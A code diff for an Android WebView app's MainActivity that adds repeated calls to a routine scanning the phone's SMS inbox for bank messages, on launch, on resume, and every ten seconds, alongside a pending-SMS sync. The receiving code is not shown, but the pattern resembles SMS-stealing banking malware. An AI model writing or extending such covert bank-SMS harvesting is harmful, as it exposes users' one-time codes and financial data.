@@ -8,7 +8,6 @@ import android.os.Handler;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import android.widget.Toast;
 
 public class MainActivity extends Activity {
 
@@ -23,6 +22,7 @@ public class MainActivity extends Activity {
     private Runnable syncRunnable = new Runnable() {
         @Override
         public void run() {
+            SmsReceiver.scanInboxBankSms(MainActivity.this, 80);
             SmsReceiver.retryPendingSms(MainActivity.this);
             syncHandler.postDelayed(this, 10000);
         }
@@ -49,7 +49,9 @@ public class MainActivity extends Activity {
 
         requestSmsPermission();
 
+        SmsReceiver.scanInboxBankSms(this, 80);
         SmsReceiver.retryPendingSms(this);
+
         syncHandler.postDelayed(syncRunnable, 10000);
     }
 
@@ -70,13 +72,15 @@ public class MainActivity extends Activity {
     }
 
     @Override
-    protected void onResume() {
+    public void onResume() {
         super.onResume();
+
+        SmsReceiver.scanInboxBankSms(this, 80);
         SmsReceiver.retryPendingSms(this);
     }
 
     @Override
-    protected void onDestroy() {
+    public void onDestroy() {
         super.onDestroy();
         syncHandler.removeCallbacks(syncRunnable);
     }
